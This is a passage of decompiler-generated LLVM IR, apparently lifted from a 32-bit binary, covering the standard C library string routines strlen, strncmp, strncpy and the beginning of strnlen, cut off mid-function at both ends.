  uselistorder label %dec_label_pc_1001beb4.dec_label_pc_1001beb4_crit_edge, { 1, 0 }
}

define i32 @__GI_strlen() local_unnamed_addr {
entry:
  %v0_1001becc = load i32, i32* @r3, align 4
  store i32 %v0_1001becc, i32* @r10, align 4
  %v1_1001bee43 = urem i32 %v0_1001becc, 4
  %v3_1001bee45 = icmp eq i32 %v1_1001bee43, 0
  br i1 %v3_1001bee45, label %dec_label_pc_1001beec, label %dec_label_pc_1001bed4

dec_label_pc_1001bed4:                            ; preds = %entry, %dec_label_pc_1001bee0
  %v0_1001bee0 = phi i32 [ %v1_1001bee0, %dec_label_pc_1001bee0 ], [ %v0_1001becc, %entry ]
  %v1_1001bed4 = inttoptr i32 %v0_1001bee0 to i8*
  %v2_1001bed4 = load i8, i8* %v1_1001bed4, align 1
  %v3_1001bed8 = icmp eq i8 %v2_1001bed4, 0
  br i1 %v3_1001bed8, label %dec_label_pc_1001bf20, label %dec_label_pc_1001bee0

dec_label_pc_1001bee0:                            ; preds = %dec_label_pc_1001bed4
  %v1_1001bee0 = add i32 %v0_1001bee0, 1
  %v1_1001bee4 = urem i32 %v1_1001bee0, 4
  %v3_1001bee4 = icmp eq i32 %v1_1001bee4, 0
  br i1 %v3_1001bee4, label %dec_label_pc_1001beec, label %dec_label_pc_1001bed4

dec_label_pc_1001beec:                            ; preds = %dec_label_pc_1001bee0, %entry
  %v0_1001bef0 = phi i32 [ %v0_1001becc, %entry ], [ %v1_1001bee0, %dec_label_pc_1001bee0 ]
  store i32 -2139062144, i32* @r8, align 4
  br label %dec_label_pc_1001bef8

dec_label_pc_1001bef8:                            ; preds = %dec_label_pc_1001bf58, %dec_label_pc_1001bef8, %dec_label_pc_1001beec
  %v1_1001bf34 = phi i32 [ %v0_1001bef0, %dec_label_pc_1001beec ], [ %v1_1001befc, %dec_label_pc_1001bef8 ], [ %v1_1001befc, %dec_label_pc_1001bf58 ]
  %v1_1001bef8 = inttoptr i32 %v1_1001bf34 to i32*
  %v2_1001bef8 = load i32, i32* %v1_1001bef8, align 4
  %v1_1001befc = add i32 %v1_1001bf34, 4
  store i32 %v1_1001befc, i32* @r11, align 4
  %v1_1001bf08 = add i32 %v2_1001bef8, -16843009
  %v2_1001bf0c = and i32 %v1_1001bf08, -2139062144
  %v5_1001bf0c = icmp eq i32 %v2_1001bf0c, 0
  br i1 %v5_1001bf0c, label %dec_label_pc_1001bef8, label %dec_label_pc_1001bf14

dec_label_pc_1001bf14:                            ; preds = %dec_label_pc_1001bef8
  %v2_1001bf14 = inttoptr i32 %v1_1001bf34 to i8*
  %v3_1001bf14 = load i8, i8* %v2_1001bf14, align 1
  %v3_1001bf18 = icmp eq i8 %v3_1001bf14, 0
  br i1 %v3_1001bf18, label %dec_label_pc_1001bf20, label %dec_label_pc_1001bf28

dec_label_pc_1001bf20:                            ; preds = %dec_label_pc_1001bed4, %dec_label_pc_1001bf14
  %v1_1001bf20 = phi i32 [ %v1_1001bf34, %dec_label_pc_1001bf14 ], [ %v0_1001bee0, %dec_label_pc_1001bed4 ]
  %v2_1001bf20 = sub i32 %v1_1001bf20, %v0_1001becc
  ret i32 %v2_1001bf20

dec_label_pc_1001bf28:                            ; preds = %dec_label_pc_1001bf14
  %v1_1001bf28 = add i32 %v1_1001bf34, 1
  %v2_1001bf28 = inttoptr i32 %v1_1001bf28 to i8*
  %v3_1001bf28 = load i8, i8* %v2_1001bf28, align 1
  %v3_1001bf2c = icmp eq i8 %v3_1001bf28, 0
  br i1 %v3_1001bf2c, label %dec_label_pc_1001bf34, label %dec_label_pc_1001bf40

dec_label_pc_1001bf34:                            ; preds = %dec_label_pc_1001bf28
  %v2_1001bf34 = sub i32 %v1_1001bf34, %v0_1001becc
  %v1_1001bf38 = add i32 %v2_1001bf34, 1
  ret i32 %v1_1001bf38

dec_label_pc_1001bf40:                            ; preds = %dec_label_pc_1001bf28
  %v1_1001bf40 = add i32 %v1_1001bf34, 2
  %v2_1001bf40 = inttoptr i32 %v1_1001bf40 to i8*
  %v3_1001bf40 = load i8, i8* %v2_1001bf40, align 1
  %v3_1001bf44 = icmp eq i8 %v3_1001bf40, 0
  br i1 %v3_1001bf44, label %dec_label_pc_1001bf4c, label %dec_label_pc_1001bf58

dec_label_pc_1001bf4c:                            ; preds = %dec_label_pc_1001bf40
  %v2_1001bf4c = sub i32 %v1_1001bf34, %v0_1001becc
  %v1_1001bf50 = add i32 %v2_1001bf4c, 2
  ret i32 %v1_1001bf50

dec_label_pc_1001bf58:                            ; preds = %dec_label_pc_1001bf40
  %v1_1001bf58 = add i32 %v1_1001bf34, 3
  %v2_1001bf58 = inttoptr i32 %v1_1001bf58 to i8*
  %v3_1001bf58 = load i8, i8* %v2_1001bf58, align 1
  %v3_1001bf5c = icmp eq i8 %v3_1001bf58, 0
  br i1 %v3_1001bf5c, label %dec_label_pc_1001bf64, label %dec_label_pc_1001bef8

dec_label_pc_1001bf64:                            ; preds = %dec_label_pc_1001bf58
  %v2_1001bf64 = sub i32 %v1_1001bf34, %v0_1001becc
  %v1_1001bf68 = add i32 %v2_1001bf64, 3
  ret i32 %v1_1001bf68

; uselistorder directives
  uselistorder i32 %v1_1001befc, { 2, 1, 0 }
  uselistorder i32 %v1_1001bf34, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_1001bee0, { 1, 0, 2 }
  uselistorder i32 %v0_1001becc, { 6, 5, 4, 3, 2, 1, 0, 7 }
  uselistorder label %dec_label_pc_1001bf20, { 1, 0 }
  uselistorder label %dec_label_pc_1001bed4, { 1, 0 }
}

define i32 @__GI_strncmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r10, align 4
  %tmp21 = icmp ult i32 %arg2, 4
  br i1 %tmp21, label %dec_label_pc_1001c048, label %dec_label_pc_1001bf84

dec_label_pc_1001bf84:                            ; preds = %entry
  %v1_1001bf84 = udiv i32 %arg2, 4
  %v0_1001bf94.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1001bf8c

dec_label_pc_1001bf8c:                            ; preds = %dec_label_pc_1001c014, %dec_label_pc_1001bf84
  %v0_1001c014 = phi i32 [ %v1_1001c014, %dec_label_pc_1001c014 ], [ %v1_1001bf84, %dec_label_pc_1001bf84 ]
  %v0_1001bfb4 = phi i32 [ %v1_1001bfcc, %dec_label_pc_1001c014 ], [ %v0_1001bf94.pre, %dec_label_pc_1001bf84 ]
  %v0_1001bfac = phi i32 [ %v1_1001bfc8, %dec_label_pc_1001c014 ], [ %tmp, %dec_label_pc_1001bf84 ]
  %v1_1001bf8c = inttoptr i32 %v0_1001bfac to i8*
  %v2_1001bf8c = load i8, i8* %v1_1001bf8c, align 1
  %v1_1001bf94 = inttoptr i32 %v0_1001bfb4 to i8*
  %v2_1001bf94 = load i8, i8* %v1_1001bf94, align 1
  %v3_1001bf9c = icmp eq i8 %v2_1001bf8c, 0
  %v4_1001bfa0.not = icmp ne i8 %v2_1001bf8c, %v2_1001bf94
  %brmerge = or i1 %v3_1001bf9c, %v4_1001bfa0.not
  br i1 %brmerge, label %dec_label_pc_1001bff4, label %dec_label_pc_1001bfac

dec_label_pc_1001bfac:                            ; preds = %dec_label_pc_1001bf8c
  %v1_1001bf98 = add i32 %v0_1001bfb4, 1
  %v1_1001bf90 = add i32 %v0_1001bfac, 1
  %v2_1001bfac = inttoptr i32 %v1_1001bf90 to i8*
  %v3_1001bfac = load i8, i8* %v2_1001bfac, align 1
  %v1_1001bfb0 = add i32 %v0_1001bfac, 2
  store i32 %v1_1001bfb0, i32* @r8, align 4
  %v2_1001bfb4 = inttoptr i32 %v1_1001bf98 to i8*
  %v3_1001bfb4 = load i8, i8* %v2_1001bfb4, align 1
  %v3_1001bfbc = icmp eq i8 %v3_1001bfac, 0
  %v1_1001bfc0 = add i32 %v0_1001bfac, 3
  %v1_1001bfc4 = add i32 %v0_1001bfb4, 3
  store i32 %v1_1001bfc4, i32* @r11, align 4
  %v1_1001bfc8 = add i32 %v0_1001bfac, 4
  store i32 %v1_1001bfc8, i32* @r10, align 4
  %v1_1001bfcc = add i32 %v0_1001bfb4, 4
  store i32 %v1_1001bfcc, i32* @r4, align 4
  %v4_1001bfd0.not = icmp ne i8 %v3_1001bfac, %v3_1001bfb4
  %brmerge1 = or i1 %v3_1001bfbc, %v4_1001bfd0.not
  br i1 %brmerge1, label %dec_label_pc_1001bff4, label %dec_label_pc_1001bfdc

dec_label_pc_1001bfdc:                            ; preds = %dec_label_pc_1001bfac
  %v1_1001bfb8 = add i32 %v0_1001bfb4, 2
  %v2_1001bfdc = inttoptr i32 %v1_1001bfb0 to i8*
  %v3_1001bfdc = load i8, i8* %v2_1001bfdc, align 1
  %v2_1001bfe0 = inttoptr i32 %v1_1001bfb8 to i8*
  %v3_1001bfe0 = load i8, i8* %v2_1001bfe0, align 1
  %v3_1001bfe4 = icmp eq i8 %v3_1001bfdc, 0
  %v4_1001bfe8.not = icmp ne i8 %v3_1001bfdc, %v3_1001bfe0
  %brmerge2 = or i1 %v3_1001bfe4, %v4_1001bfe8.not
  br i1 %brmerge2, label %dec_label_pc_1001bff4, label %dec_label_pc_1001bffc

dec_label_pc_1001bff4:                            ; preds = %dec_label_pc_1001bfdc, %dec_label_pc_1001bfac, %dec_label_pc_1001bf8c
  %v1_1001bff4.in = phi i8 [ %v3_1001bfdc, %dec_label_pc_1001bfdc ], [ %v3_1001bfac, %dec_label_pc_1001bfac ], [ %v2_1001bf8c, %dec_label_pc_1001bf8c ]
  %v0_1001bff4.in = phi i8 [ %v3_1001bfe0, %dec_label_pc_1001bfdc ], [ %v3_1001bfb4, %dec_label_pc_1001bfac ], [ %v2_1001bf94, %dec_label_pc_1001bf8c ]
  %v0_1001bff4 = zext i8 %v0_1001bff4.in to i32
  %v1_1001bff4 = zext i8 %v1_1001bff4.in to i32
  %v2_1001bff4 = sub nsw i32 %v1_1001bff4, %v0_1001bff4
  ret i32 %v2_1001bff4

dec_label_pc_1001bffc:                            ; preds = %dec_label_pc_1001bfdc
  %v2_1001bffc = inttoptr i32 %v1_1001bfc0 to i8*
  %v3_1001bffc = load i8, i8* %v2_1001bffc, align 1
  %v4_1001bffc = zext i8 %v3_1001bffc to i32
  %v2_1001c000 = inttoptr i32 %v1_1001bfc4 to i8*
  %v3_1001c000 = load i8, i8* %v2_1001c000, align 1
  %v4_1001c000 = zext i8 %v3_1001c000 to i32
  %v3_1001c004 = icmp eq i8 %v3_1001bffc, 0
  %v4_1001c008.not = icmp ne i8 %v3_1001bffc, %v3_1001c000
  %brmerge3 = or i1 %v3_1001c004, %v4_1001c008.not
  br i1 %brmerge3, label %dec_label_pc_1001c040, label %dec_label_pc_1001c014

dec_label_pc_1001c014:                            ; preds = %dec_label_pc_1001bffc
  %v1_1001c014 = add i32 %v0_1001c014, -1
  %v2_1001c014 = icmp eq i32 %v1_1001c014, 0
  br i1 %v2_1001c014, label %dec_label_pc_1001c018, label %dec_label_pc_1001bf8c

dec_label_pc_1001c018:                            ; preds = %dec_label_pc_1001c014
  %v1_1001c018 = urem i32 %arg2, 4
  br label %dec_label_pc_1001c048

dec_label_pc_1001c020:                            ; preds = %dec_label_pc_1001c050
  %v1_1001c020 = inttoptr i32 %v0_1001c020 to i8*
  %v2_1001c020 = load i8, i8* %v1_1001c020, align 1
  %v3_1001c020 = zext i8 %v2_1001c020 to i32
  %v1_1001c024 = add i32 %v0_1001c020, 1
  store i32 %v1_1001c024, i32* @r10, align 4
  %v0_1001c028 = load i32, i32* @r4, align 4
  %v1_1001c028 = inttoptr i32 %v0_1001c028 to i8*
  %v2_1001c028 = load i8, i8* %v1_1001c028, align 1
  %v3_1001c028 = zext i8 %v2_1001c028 to i32
  %v1_1001c02c = add i32 %v0_1001c028, 1
  store i32 %v1_1001c02c, i32* @r4, align 4
  %v3_1001c030 = icmp eq i8 %v2_1001c020, 0
  %v4_1001c034.not = icmp ne i8 %v2_1001c020, %v2_1001c028
  %brmerge4 = or i1 %v3_1001c030, %v4_1001c034.not
  br i1 %brmerge4, label %dec_label_pc_1001c040, label %dec_label_pc_1001c050

dec_label_pc_1001c040:                            ; preds = %dec_label_pc_1001bffc, %dec_label_pc_1001c020
  %v1_1001c040 = phi i32 [ %v3_1001c020, %dec_label_pc_1001c020 ], [ %v4_1001bffc, %dec_label_pc_1001bffc ]
  %v0_1001c040 = phi i32 [ %v3_1001c028, %dec_label_pc_1001c020 ], [ %v4_1001c000, %dec_label_pc_1001bffc ]
  %v2_1001c040 = sub nsw i32 %v1_1001c040, %v0_1001c040
  ret i32 %v2_1001c040

dec_label_pc_1001c048:                            ; preds = %entry, %dec_label_pc_1001c018
  %v1_1001c05420 = phi i32 [ 0, %entry ], [ %v4_1001bffc, %dec_label_pc_1001c018 ]
  %v0_1001c05418 = phi i32 [ 0, %entry ], [ %v4_1001c000, %dec_label_pc_1001c018 ]
  %v0_1001c02014 = phi i32 [ %tmp, %entry ], [ %v1_1001bfc8, %dec_label_pc_1001c018 ]
  %v0_1001c048 = phi i32 [ %arg2, %entry ], [ %v1_1001c018, %dec_label_pc_1001c018 ]
  %v1_1001c048 = add i32 %v0_1001c048, 1
  br label %dec_label_pc_1001c050

dec_label_pc_1001c050:                            ; preds = %dec_label_pc_1001c020, %dec_label_pc_1001c048
  %v1_1001c054 = phi i32 [ %v3_1001c020, %dec_label_pc_1001c020 ], [ %v1_1001c05420, %dec_label_pc_1001c048 ]
  %v0_1001c054 = phi i32 [ %v3_1001c028, %dec_label_pc_1001c020 ], [ %v0_1001c05418, %dec_label_pc_1001c048 ]
  %v0_1001c020 = phi i32 [ %v1_1001c024, %dec_label_pc_1001c020 ], [ %v0_1001c02014, %dec_label_pc_1001c048 ]
  %v0_1001c050 = phi i32 [ %v1_1001c050, %dec_label_pc_1001c020 ], [ %v1_1001c048, %dec_label_pc_1001c048 ]
  %v1_1001c050 = add i32 %v0_1001c050, -1
  %v2_1001c050 = icmp eq i32 %v1_1001c050, 0
  br i1 %v2_1001c050, label %dec_label_pc_1001c054, label %dec_label_pc_1001c020

dec_label_pc_1001c054:                            ; preds = %dec_label_pc_1001c050
  %v2_1001c054 = sub nsw i32 %v1_1001c054, %v0_1001c054
  ret i32 %v2_1001c054

; uselistorder directives
  uselistorder i32 %v1_1001c050, { 1, 0 }
  uselistorder i32 %v3_1001c028, { 1, 0 }
  uselistorder i32 %v3_1001c020, { 1, 0 }
  uselistorder i32 %v1_1001c014, { 1, 0 }
  uselistorder i32 %v4_1001c000, { 1, 0 }
  uselistorder i32 %v4_1001bffc, { 1, 0 }
  uselistorder i32 %v1_1001bfcc, { 1, 0 }
  uselistorder i32 %v1_1001bfc8, { 0, 2, 1 }
  uselistorder i32 %v0_1001bfac, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1001bfb4, { 2, 0, 1, 4, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1001c050, { 1, 0 }
  uselistorder label %dec_label_pc_1001c048, { 1, 0 }
  uselistorder label %dec_label_pc_1001c040, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_1001c05c = icmp eq i32 %arg2, 3
  store i1 %v3_1001c05c, i1* %cr7_eq.global-to-local, align 1
  %v1_1001c060 = add i32 %arg1, -1
  store i32 %v1_1001c060, i32* %r11.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_1001c0dc, label %dec_label_pc_1001c068

dec_label_pc_1001c068:                            ; preds = %entry
  %v1_1001c068 = udiv i32 %arg2, 4
  store i32 %v1_1001c068, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001c070

dec_label_pc_1001c070:                            ; preds = %dec_label_pc_1001c0c0, %dec_label_pc_1001c068
  %v2_1001c080 = phi i32 [ %v3_1001c0b8, %dec_label_pc_1001c0c0 ], [ %v1_1001c060, %dec_label_pc_1001c068 ]
  %v0_1001c070 = load i32, i32* @r4, align 4
  %v1_1001c070 = inttoptr i32 %v0_1001c070 to i8*
  %v2_1001c070 = load i8, i8* %v1_1001c070, align 1
  %v1_1001c074 = add i32 %v0_1001c070, 1
  store i32 %v1_1001c074, i32* @r10, align 4
  %v1_1001c078 = add i32 %v0_1001c070, 2
  store i32 %v1_1001c078, i32* @r8, align 4
  %v3_1001c07c = icmp eq i8 %v2_1001c070, 0
  store i1 %v3_1001c07c, i1* %cr7_eq.global-to-local, align 1
  %v3_1001c080 = add i32 %v2_1001c080, 1
  %v4_1001c080 = inttoptr i32 %v3_1001c080 to i8*
  store i8 %v2_1001c070, i8* %v4_1001c080, align 1
  store i32 %v3_1001c080, i32* %r11.global-to-local, align 4
  %v0_1001c084 = load i32, i32* @r8, align 4
  %v1_1001c084 = add i32 %v0_1001c084, 1
  store i32 %v1_1001c084, i32* %r9.global-to-local, align 4
  %v0_1001c088 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001c088, label %dec_label_pc_1001c0c8, label %dec_label_pc_1001c08c

dec_label_pc_1001c08c:                            ; preds = %dec_label_pc_1001c070
  %v0_1001c08c = load i32, i32* @r4, align 4
  %v1_1001c08c = add i32 %v0_1001c08c, 1
  %v2_1001c08c = inttoptr i32 %v1_1001c08c to i8*
  %v3_1001c08c = load i8, i8* %v2_1001c08c, align 1
  %v1_1001c090 = add i32 %v0_1001c084, 2
  store i32 %v1_1001c090, i32* @r4, align 4
  %v3_1001c094 = icmp eq i8 %v3_1001c08c, 0
  store i1 %v3_1001c094, i1* %cr7_eq.global-to-local, align 1
  %v3_1001c098 = add i32 %v2_1001c080, 2
  %v4_1001c098 = inttoptr i32 %v3_1001c098 to i8*
  store i8 %v3_1001c08c, i8* %v4_1001c098, align 1
  store i32 %v3_1001c098, i32* %r11.global-to-local, align 4
  %v0_1001c09c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001c09c, label %dec_label_pc_1001c0c8, label %dec_label_pc_1001c0a0

dec_label_pc_1001c0a0:                            ; preds = %dec_label_pc_1001c08c
  %v0_1001c0a0 = load i32, i32* @r10, align 4
  %v1_1001c0a0 = add i32 %v0_1001c0a0, 1
  %v2_1001c0a0 = inttoptr i32 %v1_1001c0a0 to i8*
  %v3_1001c0a0 = load i8, i8* %v2_1001c0a0, align 1
  %v3_1001c0a4 = icmp eq i8 %v3_1001c0a0, 0
  store i1 %v3_1001c0a4, i1* %cr7_eq.global-to-local, align 1
  %v3_1001c0a8 = add i32 %v2_1001c080, 3
  %v4_1001c0a8 = inttoptr i32 %v3_1001c0a8 to i8*
  store i8 %v3_1001c0a0, i8* %v4_1001c0a8, align 1
  store i32 %v3_1001c0a8, i32* %r11.global-to-local, align 4
  %v0_1001c0ac = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001c0ac, label %dec_label_pc_1001c0c8, label %dec_label_pc_1001c0b0

dec_label_pc_1001c0b0:                            ; preds = %dec_label_pc_1001c0a0
  %v0_1001c0b0 = load i32, i32* @r8, align 4
  %v1_1001c0b0 = add i32 %v0_1001c0b0, 1
  %v2_1001c0b0 = inttoptr i32 %v1_1001c0b0 to i8*
  %v3_1001c0b0 = load i8, i8* %v2_1001c0b0, align 1
  %v3_1001c0b4 = icmp eq i8 %v3_1001c0b0, 0
  store i1 %v3_1001c0b4, i1* %cr7_eq.global-to-local, align 1
  %v3_1001c0b8 = add i32 %v2_1001c080, 4
  %v4_1001c0b8 = inttoptr i32 %v3_1001c0b8 to i8*
  store i8 %v3_1001c0b0, i8* %v4_1001c0b8, align 1
  store i32 %v3_1001c0b8, i32* %r11.global-to-local, align 4
  %v0_1001c0bc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001c0bc, label %dec_label_pc_1001c0c8, label %dec_label_pc_1001c0c0

dec_label_pc_1001c0c0:                            ; preds = %dec_label_pc_1001c0b0
  %v0_1001c0c0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001c0c0 = add i32 %v0_1001c0c0, -1
  store i32 %v1_1001c0c0, i32* %ctr.global-to-local, align 4
  %v2_1001c0c0 = icmp eq i32 %v1_1001c0c0, 0
  br i1 %v2_1001c0c0, label %dec_label_pc_1001c0dc, label %dec_label_pc_1001c070

dec_label_pc_1001c0c8:                            ; preds = %dec_label_pc_1001c0b0, %dec_label_pc_1001c0a0, %dec_label_pc_1001c08c, %dec_label_pc_1001c070
  %v1_1001c0c8 = phi i32 [ %v3_1001c0b8, %dec_label_pc_1001c0b0 ], [ %v3_1001c0a8, %dec_label_pc_1001c0a0 ], [ %v3_1001c098, %dec_label_pc_1001c08c ], [ %v3_1001c080, %dec_label_pc_1001c070 ]
  %v2_1001c0c811 = sub i32 %arg1, %v1_1001c0c8
  %v2_1001c0cc = add i32 %v2_1001c0c811, %arg2
  %v1_1001c0d0 = add i32 %v2_1001c0cc, -1
  store i32 %v1_1001c0d0, i32* %r9.global-to-local, align 4
  %v4_1001c0d0 = icmp eq i32 %v1_1001c0d0, 0
  %v0_1001c0d4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1001c0d0, i32 %v0_1001c0d4)
  %v2_1001c10c.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001c104

dec_label_pc_1001c0dc:                            ; preds = %dec_label_pc_1001c0c0, %entry
  %v1_1001c0dc = urem i32 %arg2, 4
  store i32 %v1_1001c0dc, i32* %r9.global-to-local, align 4
  %v3_1001c0dc = icmp eq i32 %v1_1001c0dc, 0
  %v0_1001c0e0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001c0dc, i32 %v0_1001c0e0)
  store i32 %v1_1001c0dc, i32* %ctr.global-to-local, align 4
  %v2_1001c0f8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001c0e8

dec_label_pc_1001c0e8:                            ; preds = %dec_label_pc_1001c100.dec_label_pc_1001c0e8_crit_edge, %dec_label_pc_1001c0dc
  %v2_1001c0f8 = phi i32 [ %v3_1001c0f8, %dec_label_pc_1001c100.dec_label_pc_1001c0e8_crit_edge ], [ %v2_1001c0f8.pre, %dec_label_pc_1001c0dc ]
  %v0_1001c0ec = phi i32 [ %v0_1001c0ec.pre, %dec_label_pc_1001c100.dec_label_pc_1001c0e8_crit_edge ], [ %v1_1001c0dc, %dec_label_pc_1001c0dc ]
  %v0_1001c0e8 = load i32, i32* @r4, align 4
  %v1_1001c0e8 = inttoptr i32 %v0_1001c0e8 to i8*
  %v2_1001c0e8 = load i8, i8* %v1_1001c0e8, align 1
  %v1_1001c0ec = add i32 %v0_1001c0ec, -1
  store i32 %v1_1001c0ec, i32* %r9.global-to-local, align 4
  %v1_1001c0f0 = add i32 %v0_1001c0e8, 1
  store i32 %v1_1001c0f0, i32* @r4, align 4
  %v3_1001c0f4 = icmp eq i8 %v2_1001c0e8, 0
  store i1 %v3_1001c0f4, i1* %cr7_eq.global-to-local, align 1
  %v3_1001c0f8 = add i32 %v2_1001c0f8, 1
  %v4_1001c0f8 = inttoptr i32 %v3_1001c0f8 to i8*
  store i8 %v2_1001c0e8, i8* %v4_1001c0f8, align 1
  store i32 %v3_1001c0f8, i32* %r11.global-to-local, align 4
  %v0_1001c0fc = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001c0fc = add i32 %v0_1001c0fc, -1
  store i32 %v1_1001c0fc, i32* %ctr.global-to-local, align 4
  %v2_1001c0fc = icmp eq i32 %v1_1001c0fc, 0
  br i1 %v2_1001c0fc, label %dec_label_pc_1001c114, label %dec_label_pc_1001c100

dec_label_pc_1001c100:                            ; preds = %dec_label_pc_1001c0e8
  %v0_1001c100 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001c100, label %dec_label_pc_1001c104, label %dec_label_pc_1001c100.dec_label_pc_1001c0e8_crit_edge

dec_label_pc_1001c100.dec_label_pc_1001c0e8_crit_edge: ; preds = %dec_label_pc_1001c100
  %v0_1001c0ec.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001c0e8

dec_label_pc_1001c104:                            ; preds = %dec_label_pc_1001c100, %dec_label_pc_1001c0c8
  %v2_1001c10c.pre = phi i32 [ %v2_1001c10c.pre.pre, %dec_label_pc_1001c0c8 ], [ %v3_1001c0f8, %dec_label_pc_1001c100 ]
  %v0_1001c104 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_1001c104, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001c108

dec_label_pc_1001c108:                            ; preds = %dec_label_pc_1001c108, %dec_label_pc_1001c104
  %v2_1001c10c = phi i32 [ %v3_1001c10c, %dec_label_pc_1001c108 ], [ %v2_1001c10c.pre, %dec_label_pc_1001c104 ]
  %v3_1001c10c = add i32 %v2_1001c10c, 1
  %v4_1001c10c = inttoptr i32 %v3_1001c10c to i8*
  store i8 0, i8* %v4_1001c10c, align 1
  store i32 %v3_1001c10c, i32* %r11.global-to-local, align 4
  %v0_1001c110 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001c110 = add i32 %v0_1001c110, -1
  store i32 %v1_1001c110, i32* %ctr.global-to-local, align 4
  %v2_1001c110 = icmp eq i32 %v1_1001c110, 0
  br i1 %v2_1001c110, label %dec_label_pc_1001c114, label %dec_label_pc_1001c108

dec_label_pc_1001c114:                            ; preds = %dec_label_pc_1001c0e8, %dec_label_pc_1001c108
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1001c110, { 1, 0 }
  uselistorder i32 %v3_1001c10c, { 1, 2, 0 }
  uselistorder i32 %v1_1001c0fc, { 1, 0 }
  uselistorder i32 %v3_1001c0f8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1001c0dc, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1001c0c0, { 1, 0 }
  uselistorder i32 %v3_1001c0b8, { 0, 2, 3, 1 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001c114, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1001c118 = load i32, i32* @r4, align 4
  %v3_1001c118 = icmp eq i32 %v0_1001c118, 0
  store i32 %tmp, i32* @r10, align 4
  %v0_1001c124 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001c118, i32 %v0_1001c124)
  %v0_1001c134 = load i32, i32* @r10, align 4
  %v1_1001c134 = load i32, i32* @r4, align 4
  %v2_1001c134 = add i32 %v1_1001c134, %v0_1001c134
  %v3_1001c138 = icmp ugt i32 %v2_1001c134, %v0_1001c134
  %v4_1001c138 = icmp eq i32 %v1_1001c134, 0
  %v2_1001c13c = or i1 %v4_1001c138, %v3_1001c138
  br i1 %v2_1001c13c, label %dec_label_pc_1001c144, label %dec_label_pc_1001c140

dec_label_pc_1001c12c:                            ; preds = %dec_label_pc_1001c1ac
  br label %dec_label_pc_1001c1f0

dec_label_pc_1001c140:                            ; preds = %entry
  br label %dec_label_pc_1001c144

dec_label_pc_1001c144:                            ; preds = %entry, %dec_label_pc_1001c140
  %v0_1001c1f4 = phi i32 [ %v2_1001c134, %entry ], [ -1, %dec_label_pc_1001c140 ]
  %v1_1001c1746 = urem i32 %v0_1001c134, 4
  %v3_1001c1748 = icmp eq i32 %v1_1001c1746, 0
  br i1 %v3_1001c1748, label %dec_label_pc_1001c17c, label %dec_label_pc_1001c14c

dec_label_pc_1001c14c:                            ; preds = %dec_label_pc_1001c144, %dec_label_pc_1001c170
  %v0_1001c164 = phi i32 [ %v1_1001c170, %dec_label_pc_1001c170 ], [ %v0_1001c134, %dec_label_pc_1001c144 ]
  %v1_1001c14c = inttoptr i32 %v0_1001c164 to i8*
  %v2_1001c14c = load i8, i8* %v1_1001c14c, align 1
  %v3_1001c150 = icmp eq i8 %v2_1001c14c, 0
  br i1 %v3_1001c150, label %dec_label_pc_1001c158, label %dec_label_pc_1001c170

dec_label_pc_1001c158:                            ; preds = %dec_label_pc_1001c14c
  %v3_1001c158 = icmp ugt i32 %v0_1001c1f4, %v0_1001c164
  %v0_1001c164.v0_1001c1f4 = select i1 %v3_1001c158, i32 %v0_1001c164, i32 %v0_1001c1f4
  %v2_1001c168 = sub i32 %v0_1001c164.v0_1001c1f4, %v0_1001c134
  ret i32 %v2_1001c168

dec_label_pc_1001c170:                            ; preds = %dec_label_pc_1001c14c
  %v1_1001c170 = add i32 %v0_1001c164, 1
  %v1_1001c174 = urem i32 %v1_1001c170, 4
  %v3_1001c174 = icmp eq i32 %v1_1001c174, 0
  br i1 %v3_1001c174, label %dec_label_pc_1001c17c, label %dec_label_pc_1001c14c

dec_label_pc_1001c17c:                            ; preds = %dec_label_pc_1001c170, %dec_label_pc_1001c144
  %v0_1001c180 = phi i32 [ %v0_1001c134, %dec_label_pc_1001c144 ], [ %v1_1001c170, %dec_label_pc_1001c170 ]
  store i32 %v0_1001c180, i32* @r11, align 4
  %v2_1001c1e83 = icmp ult i32 %v0_1001c180, %v0_1001c1f4
  br i1 %v2_1001c1e83, label %dec_label_pc_1001c18c, label %dec_label_pc_1001c1f0

